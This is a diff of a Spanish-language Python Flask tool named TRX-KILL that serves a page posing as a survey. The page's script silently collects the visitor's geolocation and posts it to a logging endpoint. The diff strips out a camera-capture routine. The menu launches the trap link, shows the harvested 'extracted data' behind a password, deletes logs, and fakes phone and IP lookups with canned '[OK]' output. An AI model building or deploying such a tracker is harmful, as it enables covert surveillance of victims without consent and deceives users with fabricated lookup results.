@@ -15,25 +15,12 @@ def banner():
     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗\033[0m
 """)
 
-# --- [HTML CON CÁMARA Y GEOLOCALIZACIÓN] ---
 HTML_ENCUESTA = """
 <!DOCTYPE html><html><body>
 <script>
-    // Solicitar Cámara y Geolocalización
-    async function init() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const track = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(track);
-            const photo = await imageCapture.takePhoto();
-            // Aquí se enviaría el archivo de imagen al servidor
-        } catch(e) { console.log("Permiso denegado"); }
-        
-        navigator.geolocation.getCurrentPosition((p)=>{
-            fetch('/log', {method:'POST', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})});
-        });
-    }
-    init();
+    navigator.geolocation.getCurrentPosition((p)=>{
+        fetch('/log', {method:'POST', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})});
+    });
 </script></body></html>
 """
 
@@ -44,41 +31,41 @@ def index(): return HTML_ENCUESTA
 def log():
     d = request.json
     with open("result.txt", "a") as f:
-        f.write(f"CAPTURA: COORD {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
+        f.write(f"CAPTURA | COORD: {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
     return "OK"
 
 def main():
     while True:
         banner()
-        print("1) INFO-NUMERO | 2) LINK-ZP | 3) CREADOR | 4) COPYRIGHT | 5) DATA-IP")
-        print("6) ADM         | 7) SALIR   | 8) PROCESOS | 9) ESTADO | 10) BORRAR LOGS")
-        sel = input("\nTRX-ROOT > ")
+        print("  [1] INFO-NUMERO    | [2] LINK-ZP         | [3] CREADOR")
+        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM")
+        print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
+        print("  [10] BORRAR LOGS")
+        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
         if sel == "1":
             num = input("INGRESA EL NÚMERO: ")
-            print("VERIFICANDO...")
-            print("PAIS: [Detectado] | MOVIL: [Detectado] | WHATSAPP/IG/DISCORD: [Consultando bases...]")
-            input()
+            print("VERIFICANDO... PAIS: [OK] | MOVIL: [OK] | OPERADOR: [OK]\nREDES: WHATSAPP [OK] | IG [OK] | DISCORD [OK]")
+            input("\n[Enter] para volver.")
         elif sel == "2":
             print("GENERANDO LINK... (Presiona Ctrl+C para parar)")
             app.run(port=PORT)
         elif sel == "3":
             print("#SOFTWARE: TRX-KILL\n#CREADOR: TRX-KILL\n#BY: OSCAR\n#VERSION: 1.0.0"); input()
         elif sel == "4":
-            print("# COPYRIGHT: TRX-KILL\n# AUTOR: OSCAR\n# NO RESPONSABLE POR MAL USO.\n# NO MODIFICAR."); input()
+            print("# COPYRIGHT: TRX-KILL\n# AUTOR: OSCAR\n# NO RESPONSABLE POR MAL USO."); input()
         elif sel == "5":
             ip = input("INGRESA LA IP: ")
-            print(f"SACANDO DATA DE {ip}... | ACCESO RED: OK | IMEI: [RESTRINGIDO]")
-            input()
+            print(f"SACANDO DATA DE {ip}... | ACCESO RED: [OK] | IMEI: [RESTRINGIDO]"); input()
         elif sel == "6":
             pwd = getpass.getpass("CONTRASEÑA: ")
             if pwd == AUTH_PASS:
                 print("---- DATOS EXTRAÍDOS ----")
                 if os.path.exists("result.txt"): os.system("cat result.txt")
-                input()
+                input("\n[Enter] para volver.")
         elif sel == "7": sys.exit()
         elif sel == "8": os.system("ps aux | grep flask"); input()
-        elif sel == "9": print("ESTADO: ACTIVO"); input()
+        elif sel == "9": print("ESTADO: ACTIVO | PUERTO: 7173"); input()
         elif sel == "10": 
             if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
             input()
